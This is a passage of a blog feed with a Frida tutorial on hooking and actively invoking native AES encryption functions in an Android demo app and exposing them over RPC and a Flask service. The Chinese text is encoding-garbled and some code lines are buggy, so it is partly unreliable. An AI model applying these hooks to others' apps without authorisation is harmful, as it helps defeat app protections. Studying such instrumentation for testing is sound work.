class="line"><span class="comment">#Â æ‹¿åˆ°è¯·æ±‚è§£å¯†</span></span><br><span class="line">dataÂ =Â &#123;</span><br><span class="line">Â Â Â Â <span class="string">&quot;data&quot;</span>:Â r.text</span><br><span class="line">&#125;</span><br><span class="line">urlÂ =Â <span class="string">&quot;http://127.0.0.1:8080/getdecode&quot;</span></span><br><span class="line">rÂ =Â requests.post(url=url,headers=headers,Â data=json.dumps(data))</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><strong>è¿è¡Œ</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410101436619.png" alt="img"> </p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida </tag>
            
            <tag> rpc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸»åŠ¨è°ƒç”¨-Nativeå±‚ä¸»åŠ¨è°ƒç”¨å¹¶æš´æ¼è‡³å…¬ç½‘</title>
      <link href="/2024/10/08/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8-Native%E5%B1%82%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E5%B9%B6%E6%9A%B4%E6%BC%8F%E8%87%B3%E5%85%AC%E7%BD%91/"/>
      <url>/2024/10/08/%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8-Native%E5%B1%82%E4%B8%BB%E5%8A%A8%E8%B0%83%E7%94%A8%E5%B9%B6%E6%9A%B4%E6%BC%8F%E8%87%B3%E5%85%AC%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="Nativeå±‚ä¸»åŠ¨è°ƒç”¨"><a href="#Nativeå±‚ä¸»åŠ¨è°ƒç”¨" class="headerlink" title="Nativeå±‚ä¸»åŠ¨è°ƒç”¨"></a>Nativeå±‚ä¸»åŠ¨è°ƒç”¨</h1><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>demoä¸»è¦åŸºäºå¦‚ä¸‹è¿™ç¯‡æ–‡ç« å®ç°ï¼š</p><p><a href="https://www.jianshu.com/p/0390f598c34c">Android NDK AES åŠ è§£å¯† - ç®€ä¹¦</a></p><p>ä¸¤ä¸ªæ–¹æ³•ï¼šmethod01 å’Œ method02 å®ç°AESåŠ è§£å¯†ï¼Œä½†æ˜¯ä¸ºäº†é˜²æ­¢ AESçš„keyå’Œivç›´æ¥ç¡¬ç¼–ç å­˜å‚¨åœ¨ä»£ç ä¸­ï¼Œå¯ä»¥åšæ··æ·†&amp;èŠ±æŒ‡ä»¤å’ŒåŠ å›ºç­‰æ“ä½œã€‚</p><h2 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h2><p>1ã€ä½¿ç”¨ObjectionæŸ¥çœ‹Nativeä¸­æœ‰å“ªäº›å‡½æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objection -g com.example.demoso1 -d  explore</span><br><span class="line">memory list exports libnative-lib.so  æŸ¥çœ‹å¯¼å‡ºå‡½æ•°ï¼Œé™æ€å‡½æ•°ç›´æ¥æœç´¢</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410231028959.png" alt="image.png"> </p><p>2ã€æ‰¾åˆ°äº†å‡½æ•°åï¼šâ€_Z8method01P7_JNIEnvP7_jclassP8_jstring â€œ</p><p>å¯ä»¥åˆ©ç”¨å¦‚ä¸‹ç½‘ç«™è½¬æ¢ï¼Œå¾—åˆ°åŸå‡½æ•°åï¼š</p><p><a href="https://demangler.com/">GCC and MSVC C++ Demangler</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410231029150.png" alt="image.png"> </p><p>æˆ–è€…è¿™å—ä½¿ç”¨   <a href="https://github.com/lasting-yang/frida_hook_libart.git">https://github.com/lasting-yang/frida_hook_libart.git</a>   è¿™ä¸ªå·¥å…·ä¹Ÿå¯ä»¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida -U -f com.example.demoso1 -l hook_RegisterNatives.js â€“no-pause æŸ¥çœ‹åŸå§‹æ–¹æ³•å</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410231030913.png" alt="image.png">  </p><p>3ã€ä¿®æ”¹hook_RegisterNativesæ–‡ä»¶</p><p>å†™ä¸€ä¸ªä¸»åŠ¨è°ƒç”¨ä¹‹å‰éƒ½è¦å…ˆè¿›è¡ŒHookï¼Œæœ¬è´¨æ¥è®²Hookå°±æ˜¯ä¸€æ¬¡ç®€å•çš„ä¸»åŠ¨è°ƒç”¨ã€‚ã€‚ã€‚</p><p>ï¼ˆ1ï¼‰åŸæœ¬hook_RegisterNatives.jsæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">find_RegisterNatives</span>(<span class="params">params</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> symbols = <span class="title class_">Module</span>.<span class="title function_">enumerateSymbolsSync</span>(<span class="string">&quot;libart.so&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> addrRegisterNatives = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; symbols.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> symbol = symbols[i];</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//_ZN3art3JNI15RegisterNativesEP7_JNIEnvP7_jclassPK15JNINativeMethodi</span></span><br><span class="line">        <span class="keyword">if</span> (symbol.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;art&quot;</span>) &gt;= <span class="number">0</span> &amp;&amp;</span><br><span class="line">                symbol.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;JNI&quot;</span>) &gt;= <span class="number">0</span> &amp;&amp; </span><br><span class="line">                symbol.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;RegisterNatives&quot;</span>) &gt;= <span class="number">0</span> &amp;&amp; </span><br><span class="line">                symbol.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;CheckJNI&quot;</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            addrRegisterNatives = symbol.<span class="property">address</span>;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;RegisterNatives is at &quot;</span>, symbol.<span class="property">address</span>, symbol.<span class="property">name</span>);</span><br><span class="line">            <span class="title function_">hook_RegisterNatives</span>(addrRegisterNatives)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_RegisterNatives</span>(<span class="params">addrRegisterNatives</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (addrRegisterNatives != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addrRegisterNatives, &#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[RegisterNatives] method_count:&quot;</span>, args[<span class="number">3</span>]);</span><br><span class="line">                <span class="keyword">let</span> java_class = args[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">let</span> class_name = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>().<span class="title function_">getClassName</span>(java_class);</span><br><span class="line">                <span class="comment">//console.log(class_name);</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">let</span> methods_ptr = <span class="title function_">ptr</span>(args[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">let</span> method_count = <span class="built_in">parseInt</span>(args[<span class="number">3</span>]);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; method_count; i++) &#123;</span><br><span class="line">                    <span class="keyword">let</span> name_ptr = <span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(methods_ptr.<span class="title function_">add</span>(i * <span class="title class_">Process</span>.<span class="property">pointerSize</span> * <span class="number">3</span>));</span><br><span class="line">                    <span class="keyword">let</span> sig_ptr = <span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(methods_ptr.<span class="title function_">add</span>(i * <span class="title class_">Process</span>.<span class="property">pointerSize</span> * <span class="number">3</span> + <span class="title class_">Process</span>.<span class="property">pointerSize</span>));</span><br><span class="line">                    <span class="keyword">let</span> fnPtr_ptr = <span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(methods_ptr.<span class="title function_">add</span>(i * <span class="title class_">Process</span>.<span class="property">pointerSize</span> * <span class="number">3</span> + <span class="title class_">Process</span>.<span class="property">pointerSize</span> * <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">let</span> name = <span class="title class_">Memory</span>.<span class="title function_">readCString</span>(name_ptr);</span><br><span class="line">                    <span class="keyword">let</span> sig = <span class="title class_">Memory</span>.<span class="title function_">readCString</span>(sig_ptr);</span><br><span class="line">                    <span class="keyword">let</span> symbol = <span class="title class_">DebugSymbol</span>.<span class="title function_">fromAddress</span>(fnPtr_ptr)</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[RegisterNatives] java_class:&quot;</span>, class_name, <span class="string">&quot;name:&quot;</span>, name, <span class="string">&quot;sig:&quot;</span>, sig, <span class="string">&quot;fnPtr:&quot;</span>, fnPtr_ptr,  <span class="string">&quot; fnOffset:&quot;</span>, symbol, <span class="string">&quot; callee:&quot;</span>, <span class="title class_">DebugSymbol</span>.<span class="title function_">fromAddress</span>(<span class="variable language_">this</span>.<span class="property">returnAddress</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(find_RegisterNatives);</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰æ·»åŠ å¦‚ä¸‹æ–¹æ³•è¿›è¡Œhook</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookmethod</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;   <span class="comment">//åœ¨Javaå±‚åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œåˆ°Nativeå±‚å°±æœ‰ä¸‰ä¸ªå‚æ•°</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[0]--&gt;&quot;</span>, args[<span class="number">0</span>]);  <span class="comment">//JNIEnv</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[1]--&gt;&quot;</span>, args[<span class="number">1</span>]);  <span class="comment">//jclass</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[2]--&gt;&quot;</span>, args[<span class="number">2</span>]);  <span class="comment">//arg_ptr</span></span><br><span class="line">        &#125;,<span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[onLeave] retval:&quot;</span>, retval);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰è¿™å—åªéœ€è¦å¯¹ method1 å’Œ method2 è¿›è¡Œhookï¼Œæ‰€ä»¥åœ¨hook_RegisterNativesæ–¹æ³•ä¸­æ·»åŠ åˆ¤æ–­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (name.indexOf(&quot;method&quot;) &gt;= 0)&#123;hookmethod(fnPtr_ptr);&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410231032909.png" alt="image.png"> </p><p>ï¼ˆ4ï¼‰è¿è¡Œä»£ç ï¼Œå‘ç°æˆåŠŸhookä¸Šäº†ï¼Œæ‰“å°å‡ºæ¥äº†å¯¹åº”çš„åœ°å€ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410231033075.png" alt="img"> </p><p>ï¼ˆ5ï¼‰ä¼ è¿›å»çš„å‚æ•°å–è¿”å›å€¼éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¿™å—éœ€è¦æ‰“å°å‡ºæ¥å…·ä½“çš„å†…å®¹ï¼šJava.vm.getEnv().getStringUtfChars(result, null).readCString()</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookmethod</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;   <span class="comment">//åœ¨Javaå±‚åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œåˆ°Nativeå±‚å°±æœ‰ä¸‰ä¸ªå‚æ•°</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[0]--&gt;&quot;</span>, args[<span class="number">0</span>]);  <span class="comment">//JNIEnv</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[1]--&gt;&quot;</span>, args[<span class="number">1</span>]);  <span class="comment">//jclass</span></span><br><span class="line">           <span class="comment">//Java.vm.getEnv().getStringUtfChars(result, null).readCString();</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[2]--&gt;&quot;</span>, <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">getStringUtfChars</span>(arg[<span class="number">2</span>], <span class="literal">null</span>).<span class="title function_">readCString</span>());  <span class="comment">//arg_ptr</span></span><br><span class="line">        &#125;,<span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[onLeave] retval:&quot;</span>, <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">getStringUtfChars</span>(result, <span class="literal">null</span>).<span class="title function_">readCString</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥å¾—åˆ°åŠ å¯†å‰çš„å‚æ•°å’ŒåŠ å¯†åçš„è¿”å›å€¼äº†ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410231033094.png" alt="img"> </p><h2 id="ä¸»åŠ¨è°ƒç”¨"><a href="#ä¸»åŠ¨è°ƒç”¨" class="headerlink" title="ä¸»åŠ¨è°ƒç”¨"></a>ä¸»åŠ¨è°ƒç”¨</h2><p>å‰é¢Hookå·²ç»æ²¡é—®é¢˜ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ä¸»åŠ¨è°ƒç”¨ã€‚ã€‚ã€‚ä½†æ˜¯ <code>Interceptor.attach</code>æ˜¯ä¸èƒ½ç”¨æ¥åšä¸»åŠ¨è°ƒç”¨çš„ï¼Œè¦åšä¸»åŠ¨è°ƒç”¨éœ€è¦ä½¿ç”¨è¿™ä¸ªAPI <code>Interceptor.replace</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">replacehook</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> addrfunc = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(addr, <span class="string">&#x27;pointer&#x27;</span>,[<span class="string">&#x27;pointer&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(addr, <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span>(<span class="params">arg1,arg2,arg3</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="title function_">addrfunc</span>(arg1,arg2,arg3);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;replacehook&quot;</span>,result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;,<span class="string">&#x27;pointer&#x27;</span>,[<span class="string">&#x27;pointer&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥æˆåŠŸæ‰“å°å‡ºåœ°å€ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410231035978.png" alt="image.png"> </p><p>è°ƒç”¨Java.vm.getEnv().getStringUtfChars(result, null).readCString()æ‰“å°ä¸€ä¸‹å…·ä½“å­—ç¬¦ä¸²ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">replacehook</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> addrfunc = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(addr, <span class="string">&#x27;pointer&#x27;</span>,[<span class="string">&#x27;pointer&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(addr, <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span>(<span class="params">arg1,arg2,arg3</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="title function_">addrfunc</span>(arg1,arg2,arg3);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;replacehook&quot;</span>,<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">getStringUtfChars</span>(result, <span class="literal">null</span>).<span class="title function_">readCString</span>());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;,<span class="string">&#x27;pointer&#x27;</span>,[<span class="string">&#x27;pointer&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410231036502.png" alt="image.png"> </p><p>æœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š</p><p>ä½¿ç”¨ä¸‹é¢çš„æ–¹æ³•æ¥å®ä¹ ä¸»åŠ¨è°ƒç”¨ï¼šä¿®æ”¹hook_RegisterNativesï¼Œæ·»åŠ hookMethod01å’Œinvokemethod02</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">åœ¨hook_RegisterNativesæ–¹æ³•ä¸­æ·»åŠ </span><br><span class="line">                    <span class="keyword">if</span>(name.<span class="title function_">indexOf</span>(<span class="string">&quot;method01&quot;</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                        <span class="comment">//hookmethod(fnPtr_ptr);</span></span><br><span class="line">                        <span class="comment">//replacehook(fnPtr_ptr);</span></span><br><span class="line">                        method01addr = fnPtr_ptr;</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (name.<span class="title function_">indexOf</span>(<span class="string">&quot;method02&quot;</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                        method02addr = fnPtr_ptr;</span><br><span class="line">                        method02 = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(method02addr,<span class="string">&#x27;pointer&#x27;</span>,[<span class="string">&#x27;pointer&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æ–°å¢invokemethod01</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">invokemethod01</span>(<span class="params">contents</span>)&#123;</span><br><span class="line">    <span class="comment">//è¿™å—çš„ä¸‰ä¸ªå˜é‡æ˜¯å®šä¹‰ä¸‰ä¸ªå…¨å±€å˜é‡ï¼Œç„¶ååœ¨hook_RegisterNativesæ–¹æ³•è¿›è¡Œèµ‹å€¼</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ENV=&gt;&quot;</span>,<span class="variable constant_">ENV</span>)  </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;JCLZ=&gt;&quot;</span>,<span class="variable constant_">JCLZ</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;method01_addr is =&gt;&quot;</span>,method01addr)</span><br><span class="line">    <span class="keyword">var</span> method01 = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(method01addr,<span class="string">&#x27;pointer&#x27;</span>,[<span class="string">&#x27;pointer&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">NewStringUTF</span> = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(addrNewStringUTF,<span class="string">&#x27;pointer&#x27;</span>,[<span class="string">&#x27;pointer&#x27;</span>,<span class="string">&#x27;pointer&#x27;</span>])</span><br><span class="line">    <span class="keyword">var</span> result = <span class="literal">null</span>;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;    </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Java.vm.getEnv()&quot;</span>,<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>())</span><br><span class="line">        <span class="keyword">var</span> <span class="variable constant_">JSTRING</span> = <span class="title class_">NewStringUTF</span>(<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>(),<span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(contents))</span><br><span class="line">        result = <span class="title function_">method01</span>(<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>(),<span class="variable constant_">JSTRING</span>,<span class="variable constant_">JSTRING</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;result is =&gt;&quot;</span>,result)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;result is &quot;</span>,<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">getStringUtfChars</span>(result, <span class="literal">null</span>).<span class="title function_">readCString</span>())</span><br><span class="line">        result = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">getStringUtfChars</span>(result, <span class="literal">null</span>).<span class="title function_">readCString</span>();     </span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">æ–°å¢invokemethod02</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">invokemethod02</span>(<span class="params">contents</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="literal">null</span>;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;    </span><br><span class="line">        <span class="keyword">var</span> <span class="variable constant_">JSTRING</span> = <span class="title class_">NewStringUTF</span>(<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>(),<span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(contents))</span><br><span class="line">        result = <span class="title function_">method02</span>(<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>(),<span class="variable constant_">JSTRING</span>,<span class="variable constant_">JSTRING</span>);</span><br><span class="line">        result = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">getStringUtfChars</span>(result, <span class="literal">null</span>).<span class="title function_">readCString</span>();</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410231036105.png" alt="image.png"> </p><h2 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">rpc.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">invoke1</span>:invokemethod01, <span class="comment">// å¯¼å‡ºåä¸å¯ä»¥æœ‰å¤§å†™å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿</span></span><br><span class="line">    <span class="attr">invoke2</span>:invokemethod02</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>init.py</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> <span class="title class_">Flask</span>, jsonify, request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">def <span class="title function_">my_message_handler</span>(message , payload): #å®šä¹‰é”™è¯¯å¤„ç†</span><br><span class="line"><span class="title function_">print</span>(message)</span><br><span class="line"><span class="title function_">print</span>(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># è¿æ¥å®‰å“æœºä¸Šçš„frida-server</span><br><span class="line">#device = frida.<span class="title function_">get_device_manager</span>().<span class="title function_">add_remote_device</span>(<span class="string">&quot;192.168.0.3:8888&quot;</span>)</span><br><span class="line">#device = frida.<span class="title function_">get_device_manager</span>().<span class="title function_">add_remote_device</span>(<span class="string">&quot;118.126.66.193:58888&quot;</span>)</span><br><span class="line">device = frida.<span class="title function_">get_device_manager</span>().<span class="title function_">add_remote_device</span>(<span class="string">&quot;192.168.0.105:8888&quot;</span>)</span><br><span class="line">#device = frida.<span class="title function_">get_usb_device</span>()</span><br><span class="line"></span><br><span class="line"># å¯åŠ¨<span class="string">`demo01`</span>è¿™ä¸ªapp</span><br><span class="line">pid = device.<span class="title function_">spawn</span>([<span class="string">&quot;com.example.demoso1&quot;</span>])</span><br><span class="line">session = device.<span class="title function_">attach</span>(pid)</span><br><span class="line"></span><br><span class="line"># åŠ è½½è„šæœ¬</span><br><span class="line"><span class="keyword">with</span> <span class="title function_">open</span>(<span class="string">&quot;hook_RegisterNatives.js&quot;</span>) <span class="keyword">as</span> <span class="attr">f</span>:</span><br><span class="line">    script = session.<span class="title function_">create_script</span>(f.<span class="title function_">read</span>())</span><br><span class="line">script.<span class="title function_">on</span>(<span class="string">&quot;message&quot;</span> , my_message_handler) #è°ƒç”¨é”™è¯¯å¤„ç†</span><br><span class="line">script.<span class="title function_">load</span>()</span><br><span class="line"></span><br><span class="line">time.<span class="title function_">sleep</span>(<span class="number">3</span>)</span><br><span class="line">device.<span class="title function_">resume</span>(pid)</span><br><span class="line"></span><br><span class="line">time.<span class="title function_">sleep</span>(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(script.<span class="property">exports</span>.<span class="title function_">invoke1</span>(<span class="string">&quot;onejane&quot;</span>))</span><br><span class="line"><span class="title function_">print</span>(script.<span class="property">exports</span>.<span class="title function_">invoke2</span>(<span class="string">&quot;c6138f96658ce0cb845bdab0f9616273&quot;</span>))</span><br><span class="line"></span><br><span class="line"># è„šæœ¬ä¼šæŒç»­è¿è¡Œç­‰å¾…è¾“å…¥</span><br><span class="line">#<span class="title function_">input</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&#x27;/encrypt&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>])#urlåŠ å¯†</span><br><span class="line">def <span class="title function_">encrypt_class</span>():</span><br><span class="line">    data = request.<span class="title function_">get_data</span>()</span><br><span class="line">    json_data = json.<span class="title function_">loads</span>(data.<span class="title function_">decode</span>(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    postdata = json_data.<span class="title function_">get</span>(<span class="string">&quot;data&quot;</span>)</span><br><span class="line">    #<span class="title function_">print</span>(postdata)</span><br><span class="line">    res = script.<span class="property">exports</span>.<span class="title function_">invoke1</span>(postdata)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&#x27;/decrypt&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>])#dataè§£å¯†</span><br><span class="line">def <span class="title function_">decrypt_class</span>():</span><br><span class="line">    data = request.<span class="title 